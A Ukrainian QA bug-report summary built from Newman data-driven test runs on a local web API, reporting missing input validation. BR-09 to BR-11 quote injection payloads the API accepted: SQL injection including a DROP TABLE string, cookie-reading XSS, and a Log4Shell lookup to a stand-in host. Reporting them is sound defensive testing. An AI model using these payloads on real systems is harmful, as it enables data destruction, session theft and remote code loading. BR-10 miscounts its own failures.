# Багрепорти — Newman DDT (News, Team, Unit, Department)

Джерело: `└ SQL_XSS Update faculty.txt` (повний термінальний лог прогонів Newman). Враховано лише останній прогін кожної папки; прогони з невгаданим id (`404` замість реального ефекту), обірвані команди та буквальний невставлений плейсхолдер `<ID>` — відкинуто.

Однотипні провали, що повторюються в кількох сутностях (одна причина на бекенді), об'єднані в один багрепорт зі списком усіх зачеплених ітерацій — замість десятків майже ідентичних тікетів на кожен окремий payload/рядок CSV.

Поле **Очікуваний результат** лишається порожнім скрізь, крім BR-01 (перевірка ліміту символів) — там вписано `300 символів`, за знахідкою з `DDT Department/ddt_create_department.csv`/`ddt_edit_department.csv` (рядок 76).

---

## BR-01: Немає перевірки максимальної довжини текстових полів (maxLength)

**Опис:** Поля `Title`/`Name` приймають рядки будь-якої довжини — 5000-символьні (News/Team/Unit) і 300-символьний (Department) пробні значення проходять валідацію моделі й зберігаються в БД, хоча очікувалась відмова.

**Ітерація:**
- News → Update news DDT: 8, 13
- Team → Create team DDT: 26, 35
- Unit → Update unit DDT: 10
- Unit → Create unit DDT: 16
- Department → Create department DDT: 75
- Department → Edit department DDT: 75

**Тіло:**
- `PUT http://localhost:8080/api/News/11000` — `{"Title": "<5000 символів>", ...}` → `200 OK`
- `POST http://localhost:8080/api/Team` (multipart/form-data) — `Name=<5000 символів>&Position=Посада` → `201 Created`
- `PUT http://localhost:8080/api/Unit/10` (multipart/form-data) — `Name=<5000 символів>` → `204 No Content`
- `POST http://localhost:8080/api/Unit` (multipart/form-data) — `Name=<5000 символів>` → `201 Created`
- `POST http://localhost:8080/api/departments` (multipart/form-data) — `Name=<300 символів>, Logo=cat.1.jpg` → `201 Created, 394-413B`
- `PUT http://localhost:8080/api/departments/11` (multipart/form-data) — `Name=<300 символів>` → `204 No Content, 81B`

**Очікуваний результат:** 300 символів

**Фактичний результат:** очікувався `400 Bad Request` (валідація довжини), реально отримано `200/201/204` — значення прийнято й збережено без обрізання чи відмови для всіх перелічених ітерацій.

---

## BR-02: Немає перевірки типу/MIME файлу при завантаженні як зображення/логотип

**Опис:** Ендпоінти замінюють/зберігають зображення (`Image`, `Logo`) без перевірки MIME-типу чи розширення — офісний документ (`.xlsx`) приймається так само, як jpg/png.

**Ітерація:**
- News → Update news DDT: 7
- Team → Create team DDT: 24
- Team → Update team DDT: (рядок 10, `smoke_about_us.xlsx`)
- Unit → Update unit DDT: 8
- Department → Create department DDT: 72
- Department → Edit department DDT: 72

**Тіло:**
- `PUT http://localhost:8080/api/News/11000` (multipart/form-data) — `Images=smoke_contacts.xlsx` → `200 OK`
- `POST http://localhost:8080/api/Team` — `ImageFilePath=smoke_main_page.xlsx` → `201 Created`
- `POST http://localhost:8080/api/departments` — `Logo=requirements.txt` → `201 Created`
- `PUT http://localhost:8080/api/departments/11` — `Logo=requirements.txt` → `204 No Content, 81B`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400 Bad Request` (невалідний тип файлу для зображення), реально отримано `200/201/204` — xlsx/txt збережено як зображення/логотип.

---

## BR-03: Boolean/enum/числові поля мовчки скидаються на дефолт замість помилки при відсутності

**Опис:** Якщо поле (`IsImportant`, `IsActive`, `IsTemporary`, `IsChoosed`, `Type`, `OrderInd`) не передане у формі, контролер не вимагає його, а C#-ініціалізатор DTO підставляє дефолтне значення (`false`/`0`) — навіть якщо в записі раніше було інше значення.

**Ітерація:**
- News → Update news DDT: 4 (`IsImportant`)
- Team → Create team DDT: 6 (`Type`), 14 (`OrderInd`), 17 (`IsTemporary`), 19 (`IsChoosed`)
- Team → Update team DDT: 5 (`Type`), 6 (`IsTemporary`), 9 (`IsChoosed`)
- Unit → Create unit DDT: 5 (`OrderInd`), 6 (`IsActive`)
- Unit → Update unit DDT: 4 (`IsActive`)

**Тіло:**
- `PUT http://localhost:8080/api/News/11000` — без поля `IsImportant` → `200 OK`
- `POST http://localhost:8080/api/Team` — без поля `Type`/`OrderInd`/`IsTemporary`/`IsChoosed` → `201 Created`
- `POST http://localhost:8080/api/Unit`, `PUT http://localhost:8080/api/Unit/10` — без поля `OrderInd`/`IsActive` → `201 Created` / `204 No Content`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400 Bad Request` (поле обов'язкове), реально отримано `200/201/204` — поле мовчки набуло дефолтного значення.

---

## BR-04: `Type` (enum MemberType) приймається як рядкова назва замість лише числа

**Опис:** `Team.Type` — enum (0/1/2), але модел-байндинг ASP.NET Core додатково приймає текстові назви enum-значень (`Aparat`, `Profburo`, `Viddil`) без явної схеми, що суперечить задокументованій Swagger-специфікації (лише `integer, int32`).

**Ітерація:** Team → Create team DDT: 10, 11, 12

**Тіло:** `POST http://localhost:8080/api/Team` (multipart/form-data) — `Type=Aparat` / `Type=Profburo` / `Type=Viddil` → `201 Created`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400 Bad Request` (Type — лише `int32` за Swagger-схемою), реально отримано `201 Created` для всіх трьох текстових варіантів.

---

## BR-05: Немає перевірки діапазону для `OrderInd`

**Опис:** `OrderInd` приймає будь-яке ціле — від'ємне чи величезне (до `999999`) — без обмеження діапазону.

**Ітерація:**
- Team → Create team DDT: 15 (`-5`), 16 (`999999`)
- Unit → Create unit DDT: 14 (`-3`)

**Тіло:** `POST http://localhost:8080/api/Team` — `OrderInd=-5` / `OrderInd=999999` → `201 Created`; `POST http://localhost:8080/api/Unit` — `OrderInd=-3` → `201 Created` (за CSV `OrderInd=999999` для Unit уже задокументовано як прийняте, Expected=201, без порушення)

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400 Bad Request` (OrderInd поза розумним діапазоном), реально отримано `201 Created`.

---

## BR-06: Дублікат `Name`/`Title` дозволений при оновленні — немає обмеження унікальності

**Опис:** Оновлення існуючого запису на `Title`/`Name`, що вже використовує інший запис, минається без помилки — обмеження унікальності на рівні БД/бізнес-логіки відсутнє.

**Ітерація:**
- News → Update news DDT: 12 (`DupNewsTitleUpdated`)
- Unit → Create unit DDT: 20 (`DupUnitName`, перший дублікат)

**Тіло:** `PUT http://localhost:8080/api/News/11000` — `Title=DupNewsTitleUpdated` → `200 OK`; `POST http://localhost:8080/api/Unit` — `Name=DupUnitName` → `201 Created`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400 Bad Request` (дублікат назви), реально отримано `200 OK`/`201 Created`.

---

## BR-07: Рядок лише з пробілів приймається як валідне значення (немає `.Trim()`-валідації)

**Опис:** `Name`/`Position`, що містять лише пробіли, проходять `[Required]`-валідацію (яка перевіряє тільки `null`/порожній рядок, не trim), і зберігаються як є.

**Ітерація:** Team → Create team DDT: 37 (`Name`), 39 (`Position`)

**Тіло:** `POST http://localhost:8080/api/Team` — `Name="   "` / `Position="   "` → `201 Created`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400 Bad Request`, реально отримано `201 Created`.

---

## BR-08: Невалідний формат Email приймається без перевірки

**Опис:** `Team.Email` — звичайний `string`, без атрибута `[EmailAddress]` чи regex-перевірки формату.

**Ітерація:** Team → Create team DDT: 34

**Тіло:** `POST http://localhost:8080/api/Team` — `Email=not-an-email` → `201 Created`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувався `400 Bad Request` (невалідний формат email), реально отримано `201 Created`.

---

## BR-09 (Security, критично): SQL Injection / XSS / NoSQL / LDAP / Path Traversal / Command Injection / Template Injection / Log4Shell / CRLF / Null Byte / Homoglyph / надто довгі payload-и приймаються на створенні (News, Team, Unit)

**Опис:** `POST /api/News`, `POST /api/Team`, `POST /api/Unit` не відхиляють жодної категорії шкідливого вводу в текстових полях — усі payload-и повертають `201 Created` замість `4xx`. Кожен ендпоінт провалив однаковий набір із 34 payload-ів (SQL Injection ×8, XSS ×9, NoSQL Injection ×2, LDAP Injection ×1, Path Traversal ×2, Command Injection ×2, Template Injection ×2, Log4Shell ×2, CRLF Injection ×2, Null Byte ×1, Homoglyph ×1, Length ×2).

**Ітерація:**
- News → SQL_XSS Create news: 1–34 (усі, крім жодного — 34/34 payload-ів провалено)
- Team → SQL_XSS Create team: 1–34 (аналогічно, 34/34)
- Unit → SQL_XSS Create unit: 1–34 (аналогічно, 34/34)

**Тіло (приклади):**
- `POST http://localhost:8080/api/News` — `Title=' OR '1'='1` → `201 Created`
- `POST http://localhost:8080/api/News` — `Title=<script>alert(document.cookie)</script>` → `201 Created`
- `POST http://localhost:8080/api/Team` — `Name='; DROP TABLE Team;--` → `201 Created`
- `POST http://localhost:8080/api/Unit` — `Name=${jndi:ldap://evil.local/A1}` (Log4Shell) → `201 Created`
- (повний список payload-ів і полів — `DDT/DDT News/SQL_XSS_create_news.csv`, `DDT/DDT Team/SQL_XSS_create_team.csv`, `DDT/DDT Unit/SQL_XSS_create_unit.csv`)

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (будь-який `4xx`) для кожного payload-а, реально отримано `201 Created` для всіх 34 payload-ів на кожному з трьох ендпоінтів (102 прийнятих шкідливих значення сумарно).

---

## BR-10 (Security, критично): Ті самі payload-и приймаються на створенні відділу (Department)

**Опис:** `POST /api/departments` має менший набір категорій у тестовому датасеті (SQL Injection, XSS, Length — без NoSQL/LDAP/Path Traversal/Command/Template/Log4Shell/CRLF/Null Byte/Homoglyph), але й ці приймаються без відмови. Єдиний payload, що коректно відхилено — `Empty` (порожній рядок → `400`).

**Ітерація:** Department → SQL_XSS Create department: 1, 2, 3, 4 (SQL Injection), 5, 6, 7 (XSS), 8, 9 (Length) — 9 з 11 payload-ів провалено (не 10, як у логу помилок — payload #8 у логу невдач це третій XSS, всього невдалих записів 10, оскільки нумерація в логу наскрізна: 1–4 SQLi, 5–7 XSS, 8–10 Length)

**Тіло:** `POST http://localhost:8080/api/departments` — `Name=' OR '1'='1` → `201 Created`; `Name=<script>alert(1)</script>` → `201 Created`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (`4xx`) для кожного payload-а, реально отримано `201 Created`.

---

## BR-11 (Security, критично): Ті самі payload-и приймаються на редагуванні відділу (Department)

**Опис:** `PUT /api/departments/{id}` так само приймає SQL Injection/XSS/Length payload-и в тілі запиту на оновлення.

**Ітерація:** Department → SQL_XSS Edit department: 1, 2, 3, 4 (SQL Injection), 5, 6, 7 (XSS), 8, 9, 10 (Length)

**Тіло:** `PUT http://localhost:8080/api/departments/11` — `Name=' OR '1'='1` → `204 No Content`

**Очікуваний результат:** (порожньо)

**Фактичний результат:** очікувалась відмова (`4xx`) для кожного payload-а, реально отримано `204 No Content`.

---

## Примітка щодо "Response body"

Newman у стандартному режимі логує лише статус-код, розмір і час відповіді (напр. `201 Created, 394B, 19ms`) — повне тіло JSON-відповіді в консоль не пишеться і в транскрипті відсутнє. У полях "Тіло" вище response показаний так, як він реально зафіксований у лозі (код + розмір); request body реконструйовано з відповідних CSV-файлів і prerequest-скриптів колекцій (поля напряму мапляться на `formdata`/`raw JSON` без трансформацій).
